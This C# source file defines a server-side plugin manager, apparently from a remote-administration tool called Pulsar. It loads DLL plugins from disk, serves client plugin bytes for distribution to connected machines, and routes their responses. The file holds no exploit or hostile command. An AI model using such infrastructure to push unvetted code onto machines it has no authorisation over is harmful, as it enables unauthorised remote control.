using Pulsar.Plugin.Common;
using Pulsar.Server.Networking;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;

namespace Pulsar.Server.Plugin
{
    /// <summary>
    /// Manages server-side plugins including loading, distribution, and response handling.
    /// </summary>
    public class ServerPluginManager
    {
        private readonly ConcurrentDictionary<string, IServerPlugin> _loadedPlugins;
        private readonly ConcurrentDictionary<string, Assembly> _pluginAssemblies;
        private readonly ConcurrentDictionary<string, byte[]> _pluginBytes;
        private readonly string _pluginDirectory;        
        
        public ServerPluginManager()
        {
            _loadedPlugins = new ConcurrentDictionary<string, IServerPlugin>();
            _pluginAssemblies = new ConcurrentDictionary<string, Assembly>();
            _pluginBytes = new ConcurrentDictionary<string, byte[]>();
            _pluginDirectory = Path.Combine(Environment.CurrentDirectory, "Plugins");
            
            Directory.CreateDirectory(_pluginDirectory);
            Directory.CreateDirectory(Path.Combine(_pluginDirectory, "Server"));
            Directory.CreateDirectory(Path.Combine(_pluginDirectory, "Client"));
        }        
        
        /// <summary>
        /// Loads plugins from the plugin directory.
        /// </summary>
        public void LoadPluginsFromDirectory()
        {
            var serverPluginDir = Path.Combine(_pluginDirectory, "Server");
            var dllFiles = Directory.GetFiles(serverPluginDir, "*.dll");
            
            Console.WriteLine($"[PLUGIN] Looking for server plugins in: {serverPluginDir}");
            Console.WriteLine($"[PLUGIN] Found {dllFiles.Length} DLL files");
            
            foreach (var dllFile in dllFiles)
            {
                try
                {
                    var pluginBytes = File.ReadAllBytes(dllFile);
                    var pluginName = Path.GetFileNameWithoutExtension(dllFile);
                    Console.WriteLine($"[PLUGIN] Attempting to load server plugin: {pluginName}");
                    
                    if (LoadPlugin(pluginName, pluginBytes))
                    {
                        Console.WriteLine($"[PLUGIN] Successfully loaded server plugin: {pluginName}");
                    }
                    else
                    {
                        Console.WriteLine($"[PLUGIN] Failed to load server plugin: {pluginName}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[PLUGIN] Failed to load plugin from {dllFile}: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Loads a plugin from byte array.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <param name="pluginBytes">Plugin assembly bytes.</param>
        /// <returns>True if loaded successfully, false otherwise.</returns>
        public bool LoadPlugin(string pluginName, byte[] pluginBytes)
        {
            try
            {
                Assembly assembly = Assembly.Load(pluginBytes);
                
                var pluginTypes = assembly.GetTypes()
                    .Where(t => t.GetInterfaces().Contains(typeof(IServerPlugin)) && !t.IsAbstract)
                    .ToList();

                if (pluginTypes.Count == 0)
                {
                    return false;
                }

                var pluginType = pluginTypes.First();
                var plugin = (IServerPlugin)Activator.CreateInstance(pluginType);
                
                plugin.Initialize();
                
                _pluginAssemblies[pluginName] = assembly;
                _loadedPlugins[pluginName] = plugin;
                _pluginBytes[pluginName] = pluginBytes;
                
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to load plugin {pluginName}: {ex.Message}");
                return false;
            }
        }        
        
        /// <summary>
        /// Gets plugin bytes for distribution to clients.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <returns>Plugin bytes or null if not found.</returns>
        public byte[] GetPluginBytes(string pluginName)
        {
            _pluginBytes.TryGetValue(pluginName, out byte[] bytes);
            return bytes;
        }

        /// <summary>
        /// Gets client plugin bytes for distribution from the Client plugins directory.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <returns>Client plugin bytes or null if not found.</returns>
        public byte[] GetClientPluginBytes(string pluginName)
        {
            try
            {
                var clientPluginDir = Path.Combine(_pluginDirectory, "Client");
                var clientPluginPath = Path.Combine(clientPluginDir, $"{pluginName}.dll");
                
                if (File.Exists(clientPluginPath))
                {
                    return File.ReadAllBytes(clientPluginPath);
                }
                
                Console.WriteLine($"[PLUGIN] Client plugin not found: {clientPluginPath}");
                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[PLUGIN] Failed to read client plugin {pluginName}: {ex.Message}");
                return null;
            }
        }

        /// <summary>
        /// Processes a plugin response from a client.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <param name="clientId">ID of the client.</param>
        /// <param name="workId">Work ID.</param>
        /// <param name="response">Response data.</param>
        public void ProcessPluginResponse(string pluginName, string clientId, string workId, byte[] response)
        {
            if (_loadedPlugins.TryGetValue(pluginName, out IServerPlugin plugin))
            {
                try
                {
                    plugin.ProcessResponse(clientId, workId, response);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error processing plugin response for {pluginName}: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Processes a plugin error from a client.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <param name="clientId">ID of the client.</param>
        /// <param name="workId">Work ID.</param>
        /// <param name="error">Error data.</param>
        public void ProcessPluginError(string pluginName, string clientId, string workId, byte[] error)
        {
            if (_loadedPlugins.TryGetValue(pluginName, out IServerPlugin plugin))
            {
                try
                {
                    plugin.ProcessError(clientId, workId, error);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error processing plugin error for {pluginName}: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// Checks if a plugin is loaded.
        /// </summary>
        /// <param name="pluginName">Name of the plugin.</param>
        /// <returns>True if the plugin is loaded.</returns>
        public bool IsPluginLoaded(string pluginName)
        {
            return _loadedPlugins.ContainsKey(pluginName);
        }

        /// <summary>
        /// Gets all loaded plugin names.
        /// </summary>
        /// <returns>Collection of loaded plugin names.</returns>
        public IEnumerable<string> GetLoadedPlugins()
        {
            return _loadedPlugins.Keys.ToList();
        }

        /// <summary>
        /// Unloads a plugin.
        /// </summary>
        /// <param name="pluginName">Name of the plugin to unload.</param>
        /// <returns>True if unloaded successfully.</returns>
        public bool UnloadPlugin(string pluginName)
        {
            try
            {
                if (_loadedPlugins.TryRemove(pluginName, out IServerPlugin plugin))
                {
                    plugin.Cleanup();
                }
                
                _pluginAssemblies.TryRemove(pluginName, out _);
                _pluginBytes.TryRemove(pluginName, out _);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error unloading plugin {pluginName}: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Cleans up all plugins and resources.
        /// </summary>
        public void Cleanup()
        {
            foreach (var plugin in _loadedPlugins.Values)
            {
                try
                {
                    plugin.Cleanup();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error cleaning up plugin: {ex.Message}");
                }
            }
            
            _loadedPlugins.Clear();
            _pluginAssemblies.Clear();
            _pluginBytes.Clear();
        }
    }
}
